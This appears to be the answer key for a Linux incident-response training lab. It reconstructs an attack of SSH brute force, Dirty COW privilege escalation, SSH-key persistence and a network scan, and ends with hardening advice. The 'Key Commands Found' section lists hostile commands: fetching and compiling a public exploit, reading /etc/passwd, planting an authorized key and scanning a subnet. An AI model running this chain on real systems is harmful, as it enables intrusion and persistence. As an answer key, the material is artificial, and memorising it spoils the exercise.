# Lab 05: Solution

## Answers

| # | Answer |
|---|--------|
| 1 | **SSH brute force (weak password)** |
| 2 | **Dirty COW (CVE-2016-5195) kernel exploit** |
| 3 | **root (UID 0)** |
| 4 | **linux-exploit-suggester, linpeas, nc** |
| 5 | **Yes - scanned 10.0.0.0/24 network** |

## Attack Timeline

| Time | Event |
|------|-------|
| 14:00 | SSH brute force started |
| 14:05 | Successful login as www-data |
| 14:10 | Downloaded enumeration tools |
| 14:20 | Found vulnerable kernel |
| 14:35 | Exploited Dirty COW, got root |
| 14:45 | Created persistence (SSH key) |
| 15:00 | Network scan for lateral movement |

## Key Commands Found

```bash
# Reconnaissance
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
uname -a
cat /etc/passwd

# Privilege Escalation
wget https://exploit-db.com/download/40639.c
gcc 40639.c -o dirtycow
./dirtycow

# Persistence
mkdir -p ~/.ssh
echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys

# Lateral Movement
nmap -sV 10.0.0.0/24
```

## Vulnerability Details

**CVE-2016-5195 (Dirty COW)**
- Type: Race condition in kernel
- Impact: Write to read-only memory
- Exploit: Write to /etc/passwd to create root user

## Detection & Hardening

1. **Patch kernel** - Apply security updates
2. **SSH key auth only** - Disable password auth
3. **Fail2ban** - Block brute force
4. **Monitor** - Alert on privilege escalation